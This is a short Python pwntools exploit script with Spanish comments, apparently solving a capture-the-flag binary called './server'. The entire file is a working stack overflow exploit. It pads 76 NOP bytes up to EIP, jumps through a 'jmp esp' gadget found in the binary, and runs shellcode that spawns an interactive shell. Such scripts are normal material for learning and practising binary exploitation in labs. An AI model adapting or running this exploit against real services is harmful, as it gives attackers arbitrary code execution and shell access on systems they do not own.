#!/bin/python3

from pwn import *

exe = './server'

#Automatically get context arch, bits, os etc, para luego poder buscar rop gadgets
elf = context.binary = ELF(exe, checksec=False)

#context.log_level = 'debug'    #Modo debug para ver que esta pasando

io = process(exe)

#Offset hasta EIP
padding = 76

jmp_esp = asm('jmp esp')    #Crea la instruccion jmp esp en ensamblador para poder buscarla
jmp_esp = next(elf.search(jmp_esp))     #Busca la secuencia jmp esp en el contexto

shellcode = asm(shellcraft.sh())

#shellcode += asm(shellcraft.exit())

# Build payload
payload = flat(
    asm('nop') * padding,   # Podrian ser A, pero es mas correcto
    jmp_esp,
    #asm('nop') * 16,   #A veces se necesita un peque√±o offset, que debe ser nops para que no se ejecute
    shellcode
)

# Exploit
io.sendlineafter(b':', payload)

# Get flag/shell
io.interactive()
